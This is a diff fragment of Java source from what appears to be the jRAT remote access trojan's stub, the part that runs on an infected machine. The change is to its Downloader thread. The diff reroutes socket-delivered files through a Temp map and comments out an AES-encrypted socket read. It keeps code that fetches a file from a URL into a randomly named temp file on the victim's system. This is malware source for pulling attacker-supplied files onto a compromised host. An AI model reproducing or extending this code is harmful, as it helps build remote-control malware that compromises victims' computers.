@@ -8,7 +8,7 @@ import java.net.URLConnection;
 import java.util.Random;
 
 import se.jrat.common.downloadable.Downloadable;
-import se.jrat.common.io.FileIO;
+import se.jrat.stub.packets.Temp;
 import se.jrat.stub.packets.incoming.Packet36Uninstall;
 
 import com.redpois0n.oslib.OperatingSystem;
@@ -36,7 +36,9 @@ public class Downloader extends Thread {
 
 			try {
 				File file = null;
-				if (update) {
+				if (readFromSocket) {
+					file = Temp.MAP.get(url);
+				} else if (update) {
 					file = File.createTempFile(Configuration.name + (new Random()).nextInt(), ".jar");
 				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 					file = new File(System.getProperty("java.io.tmpdir"), fileName);
@@ -50,7 +52,7 @@ public class Downloader extends Thread {
 				
 				
 				if (readFromSocket) {
-					new FileIO().readFile(file, Connection.instance.getSocket(), Connection.instance.getDataInputStream(), Connection.instance.getDataOutputStream(), null, Main.aesKey);					
+					//new FileIO().readFile(file, Connection.instance.getSocket(), Connection.instance.getDataInputStream(), Connection.instance.getDataOutputStream(), null, Main.aesKey);					
 				} else {
 					URLConnection con = new URL(url).openConnection();
 					InputStream in = con.getInputStream();
